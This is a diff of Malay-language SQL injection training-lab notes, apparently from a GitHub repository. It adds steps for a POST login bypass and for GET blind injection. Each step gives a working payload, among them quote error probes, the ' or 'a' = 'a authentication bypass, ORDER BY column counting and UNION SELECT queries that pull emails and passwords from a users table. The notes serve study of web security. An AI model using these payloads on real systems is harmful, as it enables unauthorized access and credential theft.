@@ -77,3 +77,37 @@ payload `user-1'union all select 1,group_concat(column_name),3,4,5 from informat
 payload `user-1'union all select 1,group_concat(email),group_concat(password),4,5 from users-- ` untuk senarai email dan password
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/dc5c638f-be2f-4c0c-b3f9-5d86750151c9)
+
+## Level C - POST Bypass Auth
+payload `'` untuk check error
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/6ba94a2a-bda7-4d3e-8305-d6582f79378b)
+
+payload `'-- ` untuk repair error dan page ni vuln
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/fd5010f6-14d0-4c94-9edf-03ea16485da9)
+
+payload `' or 'a' = 'a` untuk bypass login dan letak di password sekali, auto dpt masuk
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f30df5d1-917f-4475-aabf-e3b9a0631812)
+
+## Level D - GET Blind Based
+blind sama dgn get method
+
+payload `'` untuk test error page tapi blind tiada error atau data tk keluar page mcm gambar
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/622c5881-2e02-498b-b282-16e20422c651)
+
+payload `'--+` untuk repair dan page vuln
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7f368d86-c3f8-4dc7-abc5-d3fa1cb2b789)
+
+payload `'+order+by+5--+` untuk cari berapa column yg ada dlm db contoh 6 dpt blind error so db ada 5 column
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bbccdea2-3ebb-4987-9704-8a587d2299d1)
+
+payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk tgk username dan email dikeluarkan berada di column no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1a51e4f-3619-4ea8-ab1d-2a9d67def8e2)
+
+seterusnya step sama dgn get method
